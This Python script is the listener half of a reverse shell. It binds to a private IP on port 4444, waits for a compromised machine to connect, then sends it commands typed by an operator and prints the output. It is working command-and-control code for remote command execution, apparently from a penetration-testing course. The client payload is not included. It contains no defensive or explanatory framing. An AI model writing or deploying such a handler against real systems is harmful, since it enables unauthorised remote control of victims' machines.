import socket, json

class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print(f"[+] Got a connection from {str(address)}")
    
    def reliable_send(self, data):
        json_data = json.dumps(data.split(" "))
        self.connection.send(json_data.encode())
    
    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
           self.reliable_send(command)
           return self.reliable_receive()
    
    def run(self):
        while True:
            command = input("Enter cmd >> ")
            if command == "exit":
                self.reliable_send(command)
                break
            else:
                result = self.execute_remotely(command)
                print(result)
        self.connection.close()

my_listener = Listener("192.168.60.2", 4444)
my_listener.run()